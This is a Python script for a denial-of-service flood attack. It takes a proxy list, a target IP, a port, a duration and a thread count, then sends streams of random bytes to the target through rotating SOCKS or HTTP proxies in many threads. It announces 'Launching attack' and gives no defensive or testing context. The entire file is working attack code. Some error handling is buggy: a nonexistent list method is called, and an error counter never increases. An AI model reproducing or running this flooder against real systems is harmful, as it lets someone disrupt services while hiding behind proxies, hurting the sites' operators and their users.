import socket, socks, random, threading, time, os, sys
from random import choice, randint

# null is epik :P

try:
    proxyfile = sys.argv[1]
    target = sys.argv[2]
    port = sys.argv[3]
    duration = sys.argv[4]
    threadcount = sys.argv[5]
except:
    sys.exit(f'Invalid syntax: python3 {sys.argv[0]} <proxy list> <target ip> <target port> <duration> <thread count>')

if '--socks4' in sys.argv: proto = socks.SOCKS4
elif '--http' in sys.argv: proto = socks.HTTP
else: proto = socks.SOCKS5

try:
	proxies = []
	with open(proxyfile, 'r') as proxlist:
	    [proxies.append(socksprox.strip('\n')) for socksprox in proxlist.readlines()]
except:
	sys.exit('Failed to open proxy file.')

def flood():

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        errcount = 0 # reset for every new proxy
        proxip, proxport = choice(proxies).split(':')

        s = socks.socksocket()
        try: s.set_proxy(proto, str(proxip), int(proxport))
        except: proxies.delete(f'{proxip}:{proxport}'); continue

        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try: s.connect( (target, int(port) ))
        except: continue

        while 1:
            if errcount >= 20:
                print(f'[({proxip}:{proxport})] Dropping proxy due to it sucking ass'); s.close()
                break # switch to new proxy
            try: s.send( os.urandom( randint(1024, 2048) ) )
            except: errcount+1

if __name__ == '__main__':
    print(f'Launching attack on {target}:{port}, for {duration} seconds using {threadcount} threads.')
    print(f'Proxies loaded: {str(len(proxies))}\n')

    kaboom = []
    for _ in range(int(threadcount)):
        thread = threading.Thread(target=flood)
        thread.start()
        kaboom.append(thread)

    for thread in kaboom:
        thread.join()
    print('Attack finished.')